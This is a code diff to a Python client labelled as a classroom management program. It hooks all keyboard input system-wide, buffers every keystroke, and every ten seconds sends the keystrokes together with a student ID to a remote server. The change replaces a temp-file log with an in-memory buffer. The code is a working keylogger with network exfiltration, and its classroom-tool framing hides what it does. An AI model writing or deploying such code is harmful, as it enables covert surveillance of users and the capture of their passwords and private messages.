@@ -17,7 +17,7 @@ import PyHook3 as pyHook
 
 IntervalTime = 10 #每隔这些时间。向服务器发送键盘钩子数据
 root = tkinter.Tk(screenName='User login')        #创建应用程序窗口
-root.title('课堂管理系统客户端')
+root.title('课堂管理系统客户端1.3')
 root.geometry('320x150+500+300')
 root.resizable(False, False)   #不允许改变窗口大小
 
@@ -162,25 +162,27 @@ def sendkey():
             sock.connect((serverIP, 10008))
         except Exception as e:
             continue
-        path = os.getenv('temp')
-        filename = path + '\\' + 'recordkey.txt'
-        if os.path.exists(filename):
-            with open(filename, 'r+') as fp:
-                li = fp.readlines()
-                fp.seek(0)
-                fp.truncate()
-                fp.close()
-        else:
-            with open(filename, mode='w', encoding='utf-8') as ff:
-                print("文件创建成功！")
-        records = ''.join(li).encode()
-        xuehao1 = xuehao.encode()
-        sock.send(xuehao1)
-        time.sleep(2)
-        sock.send(records)
+
+        # path = os.getenv('temp')
+        # filename = path + '\\' + 'recordkey.txt'
+        # if os.path.exists(filename):
+        #     with open(filename, 'r+') as fp:
+        #         li = fp.readlines()
+        #         fp.seek(0)
+        #         fp.truncate()
+        #         fp.close()
+        # else:
+        #     with open(filename, mode='w', encoding='utf-8') as ff:
+        #         print("文件创建成功！")
+        # records = ''.join(li).encode()
+
+        records = "".join(KeyBuffer)
+        message = xuehao +"&"+records
+        sock.sendall(message.encode())
         sock.close()
+        KeyBuffer.clear()
 
-
+KeyBuffer = []
 def onKeyboardEvent(event):
     key = event.Key
     print(key)
@@ -193,11 +195,14 @@ def onKeyboardEvent(event):
     # elif key == "Tab":
     #     key = " "
     # elif key =="LShift" or key == "RShift":
-    #     key ==""   
-    path = os.getenv('temp')
-    filename = path + '\\' + 'recordkey.txt'
-    with open(filename, 'a+') as f:
-        f.write(key)
+    #     key ==""
+
+    # path = os.getenv('temp')
+    # filename = path + '\\' + 'recordkey.txt'
+    # with open(filename, 'a+') as f:
+    #     f.write(key)
+    print(key)
+    KeyBuffer.append(key)
     return True
 
 def recordkey():
